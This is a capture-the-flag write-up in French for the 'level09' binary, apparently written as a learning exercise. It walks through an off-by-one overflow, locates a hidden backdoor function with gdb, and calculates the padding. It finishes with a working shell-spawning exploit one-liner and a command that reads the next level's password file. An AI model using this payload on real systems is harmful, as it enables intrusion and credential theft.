En analysant le code, on constate que nous avons une structure MessageContext. Dans cette derniere, l'username a une taille de 40. Cependant, setusername copie jusqu'a 41: Le but va donc de faire un overflow grace a cela.

# Etape 1: Trouver la valeur de username

Etape assez simple, etant donne que username a une size de 40, il en est de meme pour le padding.

Le 41eme char va etre set a 255 (0xff), et ce afin de set le premier octet de msg_size sur 255. Le strncpy de set_msg va donc copier 255 octets plutot que 140.

# Etape 2: Recuperer l'adresse de secret_backdoor

```shell
objdump -t ./level09 | grep secret_backdoor
```

--> On obtient bien une adresse, mais elle n'est pas coherente, elle est donc "cache", on va chercher avec gdb pendant l'execution:

```shell
gdb ./level09
break main
run
x secret_backdoor
#0x55555555488c <secret_backdoor>:	0xe5894855
```

--> Nous avons donc l'adresse de secret_backdoor: 0x55555555488c (\x8c\x48\x55\x55\x55\x55\x00\x00 en Little Endian)

NB: On fini par \x00\x00 car une adresse fait 8 octets, et que sans \x00, notre adresse ferait 6 octets (impossible)

# Etape 3: Trouver la valeur de msg

Nous allons mettre un appel de la fonction secret_backdoor ainsi que /bin/sh dans msg, nous devons cependant trouver le padding afin de savoir quand mettre cette adresse (sur l'adresse de retour).

Pour cela, on va faire segfault notre programme:

```shell
gdb ./level09
run < <(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*50 + 'B'*50 + 'C'*50 + 'D'*50 + 'E'*55")
info registers
```

--> rbp a cette valeur: 0x4444444444444444: 0x44 correspond a D, donc notre segfault se trouve entre 150-200.

```shell
gdb ./level09
run < <(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*150 + '0123456789qwertyuiopasd+ghjklzxcvbnmqwertyuiopasd-ghjklzxcvbnm'")
info registers
```

--> rbp = 0x2d647361706f6975 --> 0x2d = -, - est le 49eme charactere donc notre padding est de:
1 + 150 + 49 = 200. (1 = \n)

# Resume

Nous avons donc:
1. La valeur de username: 'A'*40 + '\xff'
2. L'adresse de secret_backdoor: \x8c\x48\x55\x55\x55\x55
3. Le padding de msg: 200.

La valeur de msg sera donc : 'A'*200 + '\x8c\x48\x55\x55\x55\x55' + '/bin/sh'

# Execution


```shell
(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'"; cat) | ./level09
```

--> Nous avons donc acces a un terminal:

```shell
whoami
#end
cat /home/users/end/.pass
```

--> Nous avons notre flag pour notre dernier niveau !
